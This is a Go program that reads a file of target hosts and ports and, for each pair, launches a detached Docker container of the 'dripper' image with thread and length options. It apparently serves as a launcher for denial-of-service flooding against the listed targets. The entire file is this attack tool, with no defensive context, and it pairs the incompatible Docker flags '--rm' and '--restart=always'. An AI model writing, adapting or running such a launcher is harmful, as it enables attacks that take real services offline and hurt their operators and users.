package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"strings"
)

type Protocol struct {
	Port string
}

type Target struct {
	Host     string
	Settings []Protocol
}

func Parse(path string) (list []Target, err error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewReader(file)

	target := Target{}
	for {
		line, _, errFile := scanner.ReadLine()

		if errFile == io.EOF {
			break
		}

		str := string(line)

		if strings.Contains(str, ".") {
			target.Host = strings.TrimSpace(str)
		}

		if strings.Contains(str, "/") {
			target.Settings = make([]Protocol, 0, len(str))
			substr := make([]string, 0, len(str))
			if strings.Contains(str, ",") {
				substr = append(substr, strings.Split(str, ",")...)

				for i := 0; i < len(substr); i++ {
					protocol := strings.Split(strings.TrimSpace(substr[i]), "/")

					target.Settings = append(target.Settings, Protocol{Port: protocol[0]})
					//for j := 0; j < len(protocol); j++ {
					//
					//}
				}
			} else {
				protocol := strings.Split(strings.TrimSpace(str), "/")

				target.Settings = append(target.Settings, Protocol{Port: protocol[0]})
			}

		}

		if str == "" {
			list = append(list, target)
			target = Target{}
		}

	}

	return list, err
}

func main() {
	path := flag.String("path", "", "path - set full path to target list with IP and Ports")
	flag.Parse()

	list, err := Parse(*path)
	if err != nil {
		log.Fatal(err)
	}

	for i := 0; i < len(list); i++ {
		for j := 0; j < len(list[i].Settings); j++ {
			port := fmt.Sprintf("-p %v", list[i].Settings[j].Port)
			host := fmt.Sprintf("-s %v", list[i].Host)
			out, err := exec.Command("docker",
				"run",
				"-d",
				"--rm",
				"--network=host",
				"--restart=always",
				"alexmon1989/dripper:latest",
				"-t 150",
				"-l 2048",
				port,
				host,
			).Output()

			if err != nil {
				log.Fatal(err)
			}

			//fmt.Println("docker",
			//	"run",
			//	"-d",
			//	"--rm",
			//	"--network=host",
			//	"alexmon1989/dripper:latest",
			//	"-t 150",
			//	"-l 2048",
			//	port,
			//	host,
			//)

			fmt.Println(fmt.Sprintf("%s", out))
		}
	}
}
